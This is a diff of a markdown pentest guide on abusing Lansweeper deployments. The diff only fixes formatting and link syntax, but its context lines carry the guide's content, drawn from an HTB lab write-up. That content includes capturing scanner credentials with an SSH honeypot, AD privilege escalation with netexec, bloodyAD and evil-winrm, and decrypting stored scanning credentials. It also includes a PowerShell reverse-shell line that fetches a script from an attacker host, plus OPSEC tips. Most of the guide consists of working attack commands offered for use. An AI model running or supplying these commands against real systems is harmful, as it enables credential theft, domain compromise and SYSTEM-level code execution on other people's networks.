@@ -1,6 +1,5 @@
 # Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE
 
-
 Lansweeper is an IT asset discovery and inventory platform commonly deployed on Windows and integrated with Active Directory. Credentials configured in Lansweeper are used by its scanning engines to authenticate to assets over protocols like SSH, SMB/WMI and WinRM. Misconfigurations frequently allow:
 
 - Credential interception by redirecting a scanning target to an attacker-controlled host (honeypot)
@@ -30,7 +29,7 @@ Example with sshesame:
 server:
   listen_address: 10.10.14.79:2022
 ```
-```
+
 ```bash
 # Install and run
 sudo apt install -y sshesame
@@ -39,7 +38,7 @@ sshesame --config sshesame.conf
 # authentication for user "svc_inventory_lnx" with password "<password>" accepted
 # connection with client version "SSH-2.0-RebexSSH_5.0.x" established
 ```
-```
+
 Validate captured creds against DC services:
 
 ```bash
@@ -48,7 +47,7 @@ netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-```
+
 Notes
 - Works similarly for other protocols when you can coerce the scanner to your listener (SMB/WinRM honeypots, etc.). SSH is often the simplest.
 - Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).
@@ -66,7 +65,7 @@ netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhoun
 # RustHound-CE collection (zip for BH CE import)
 rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
 ```
-```
+
 Exploit GenericAll on group with BloodyAD (Linux):
 
 ```bash
@@ -77,19 +76,19 @@ bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<passwor
 # Confirm WinRM access if the group grants it
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-```
+
 Then get an interactive shell:
 
 ```bash
 evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-```
+
 Tip: Kerberos operations are time-sensitive. If you hit KRB_AP_ERR_SKEW, sync to the DC first:
 
 ```bash
 sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
 ```
-```
+
 ## 3) Decrypt Lansweeper-configured secrets on the host
 
 On the Lansweeper server, the ASP.NET site typically stores an encrypted connection string and a symmetric key used by the application. With appropriate local access, you can decrypt the DB connection string and then extract stored scanning credentials.
@@ -111,21 +110,21 @@ powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
 #  - Connect to Lansweeper DB
 #  - Decrypt stored scanning credentials and print them in cleartext
 ```
-```
+
 Expected output includes DB connection details and plaintext scanning credentials such as Windows and Linux accounts used across the estate. These often have elevated local rights on domain hosts:
 
 ```text
 Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
 Inventory Linux    svc_inventory_lnx        <StrongPassword!>
 ```
-```
+
 Use recovered Windows scanning creds for privileged access:
 
 ```bash
 netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 # Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
 ```
-```
+
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
 As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.
@@ -144,7 +143,7 @@ powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
 # Reverse shell example (adapt to your listener)
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
 ```
-```
+
 OPSEC
 - Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.
 
@@ -163,9 +162,9 @@ OPSEC
 - WinRM usage and lateral movement
 
 ## References
-- [[https://0xdf.gitlab.io/2025/08/14/htb-sweep.html|HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)]]
-- [[https://github.com/jaksi/sshesame|sshesame (SSH honeypot)]]
-- [[https://github.com/Yeeb1/SharpLansweeperDecrypt|SharpLansweeperDecrypt]]
-- [[https://github.com/CravateRouge/bloodyAD|BloodyAD]]
-- [[https://github.com/SpecterOps/BloodHound|BloodHound CE]]
+- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
+- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
+- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
+- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
 
